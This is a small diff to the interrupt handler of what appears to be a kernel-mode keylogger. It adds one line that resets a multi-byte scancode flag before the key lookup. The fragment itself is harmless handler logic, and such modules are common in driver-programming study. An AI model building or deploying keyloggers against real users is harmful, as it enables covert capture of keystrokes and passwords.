@@ -86,6 +86,7 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	}
 	if (multicode)
 	{
+		multicode = 0;
 		if (scancode <= 0x80)
 		{
 			key = &multicode_to_key[scancode];
